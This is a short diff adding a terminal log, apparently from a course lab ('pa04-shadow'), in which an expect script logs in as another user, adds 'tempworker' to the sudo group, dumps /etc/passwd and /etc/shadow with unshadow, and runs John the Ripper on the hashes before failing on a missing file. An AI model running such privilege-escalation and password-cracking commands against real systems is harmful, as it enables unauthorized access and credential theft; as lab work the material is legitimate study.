@@ -1,0 +1,22 @@
+ 
+This is the output from the terminal when your script was run.
+
+tempworker@debian:~/pa04-shadow/stbrb$ ./funandgames.sh 
+spawn su yourboss
+Password: 
+$ sudo gpasswd -a tempworker sudo
+horse
+[sudo] password for yourboss: 
+Adding user tempworker to group sudo
+$ sudo unshadow /etc/passwd /etc/shadow > /home/yourboss/attempt.txt
+horse
+$ sh: 3: horse: not found
+$ sudo john --wordlist=/usr/share/john/password.lst /home/yourboss/attempt.txt
+couldn't open "/home/yourboss/passwords.txt": no such file or directory
+    while executing
+"open "/home/yourboss/passwords.txt" r"
+    invoked from within
+"set fp [open "/home/yourboss/passwords.txt" r]"
+    (file "./expect_script.sh" line 30)
+tempworker@debian:~/pa04-shadow/stbrb$ 
+
